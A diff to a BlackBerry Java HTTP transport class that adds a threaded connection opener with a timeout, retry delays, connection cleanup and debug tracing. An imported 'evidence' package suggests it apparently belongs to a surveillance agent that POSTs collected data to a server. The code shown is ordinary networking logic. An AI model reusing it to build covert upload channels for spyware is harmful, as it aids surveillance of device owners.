@@ -21,6 +21,7 @@ import net.rim.device.api.io.http.HttpProtocolConstants;
 import blackberry.Status;
 import blackberry.debug.Debug;
 import blackberry.debug.DebugLevel;
+import blackberry.evidence.Evidence;
 import blackberry.utils.Check;
 import blackberry.utils.Utils;
 
@@ -29,8 +30,7 @@ public abstract class HttpTransport extends Transport {
     private static final int PORT = 80;
 
     //#ifdef DEBUG
-    private static Debug debug = new Debug("HttpTransport",
-            DebugLevel.VERBOSE);
+    private static Debug debug = new Debug("HttpTransport", DebugLevel.VERBOSE);
     //#endif
 
     String host;
@@ -55,7 +55,6 @@ public abstract class HttpTransport extends Transport {
 
     //private final String USER_AGENT = "Profile/MIDP-2.0 Configuration/CLDC-1.0";
     protected final String CONTENT_TYPE = "application/octet-stream";
-   
 
     public void start() {
         //#ifdef FOLLOW_MOVED_URLS
@@ -76,8 +75,8 @@ public abstract class HttpTransport extends Transport {
         //#ifdef DEBUG
         debug.trace("command, available: " + available);
         //#endif
-        
-        if(!available){
+
+        if (!available) {
             throw new TransportException(20);
         }
 
@@ -96,6 +95,7 @@ public abstract class HttpTransport extends Transport {
             //#ifdef DEBUG
             debug.trace("command: second chance");
             //#endif
+            Utils.sleep(1000);
             connection = createRequest();
             sendHttpPostRequest(connection, data);
         }
@@ -106,7 +106,7 @@ public abstract class HttpTransport extends Transport {
 
         int status;
         try {
-          //#ifdef DEBUG
+            //#ifdef DEBUG
             debug.trace("command: get response");
             //#endif
             status = connection.getResponseCode();
@@ -127,7 +127,7 @@ public abstract class HttpTransport extends Transport {
 
             // check response, if ok parse it            
             if (status == HttpConnection.HTTP_OK) {
-              //#ifdef DEBUG
+                //#ifdef DEBUG
                 debug.trace("command: parse response");
                 //#endif
                 byte[] content = parseHttpConnection(connection);
@@ -152,7 +152,10 @@ public abstract class HttpTransport extends Transport {
             throw new TransportException(8);
         } finally {
             try {
-                if (connection != null) {
+                if (connection != null) {    
+                    //#ifdef DEBUG
+                    debug.trace("command: closing connection");
+                    //#endif
                     connection.close();
                 }
             } catch (IOException e) {
@@ -171,10 +174,13 @@ public abstract class HttpTransport extends Transport {
         HttpConnection httpConn = null;
 
         try {
-           
+            String url = getUrl();
+            //#ifdef DEBUG
+            debug.trace("createRequest url=" + url);
+            //#endif
             // qui sembra bloccarsi, certe volte, con wifi.
-            httpConn = (HttpConnection) Connector.open(getUrl());
-            
+            httpConn = (HttpConnection) open(url);
+
             //#ifdef DEBUG
             debug.trace("createRequest: setting POST");
             //#endif
@@ -186,7 +192,7 @@ public abstract class HttpTransport extends Transport {
                 //#endif
                 httpConn.setRequestProperty(
                         HttpProtocolConstants.HEADER_COOKIE, cookie);
-            } else{
+            } else {
                 //#ifdef DEBUG
                 debug.trace("createRequest: no cookie");
                 //#endif
@@ -204,6 +210,15 @@ public abstract class HttpTransport extends Transport {
                     "sendHttpPostRequest: httpConn null");
             //#endif  
         } catch (Exception ex) {
+            if(httpConn!=null){
+                try {
+                    httpConn.close();
+                } catch (IOException e) {
+                    //#ifdef DEBUG
+                    debug.trace("createRequest: " + e);
+                    //#endif
+                }
+            }
             throw new TransportException(1);
         }
         return httpConn;
@@ -330,8 +345,8 @@ public abstract class HttpTransport extends Transport {
                 Utils.copy(content, size, buffer, 0, len);
                 size += len;
             }
-            buffer=null;
-            
+            buffer = null;
+
             //#ifdef DEBUG
             debug.trace("parseHttpConnection received:" + size);
             //#endif
@@ -355,5 +370,81 @@ public abstract class HttpTransport extends Transport {
             //#endif
             throw new TransportException(6);
         }
+    }    
+    
+    protected HttpConnection open(String url) throws TransportException {
+        // Crea un thread, dentro il quale genera l'url.
+        // Se non esce entro poco, ci riprova.
+        InternalOpener opener = new InternalOpener(url);
+        Thread thread = new Thread(opener);
+        thread.start();
+
+        HttpConnection connection = opener.getConnection();
+        if (connection == null) {
+            //#ifdef DEBUG
+            debug.trace("open: null connection");
+            Evidence.info("NULL CONNECTION");
+            //#endif                       
+            thread.interrupt();
+            
+            throw new TransportException(25);
+            
+        } else {
+            //#ifdef DEBUG
+            debug.trace("open: " + connection);
+            //#endif
+        }
+
+        opener=null;
+        thread=null;
+        return connection;
+    }
+
+    class InternalOpener implements Runnable {
+        HttpConnection connection;
+        private String url;
+        Object monitor = new Object();
+
+        InternalOpener(String url) {
+            this.url = url;
+        }
+
+        public void run() {
+            try {
+                connection = (HttpConnection) Connector.open(url);
+                synchronized (monitor) {
+                    //#ifdef DEBUG
+                    debug.trace("run, notifyAll ");
+                    //#endif
+                    monitor.notifyAll();
+                }
+
+            } catch (IOException e) {
+                //#ifdef DEBUG
+                debug.error("run: " + e);
+                //#endif
+            }
+
+        }
+
+        public HttpConnection getConnection() {
+            synchronized (monitor) {
+                if (connection != null) {
+                    return connection;
+                }
+
+                try {
+                    monitor.wait(5000);
+                } catch (InterruptedException e) {
+                    //#ifdef DEBUG
+                    debug.error("getConnection: " + e);
+                    //#endif
+                }
+            }
+
+            return connection;
+
+        }
+
     }
 }
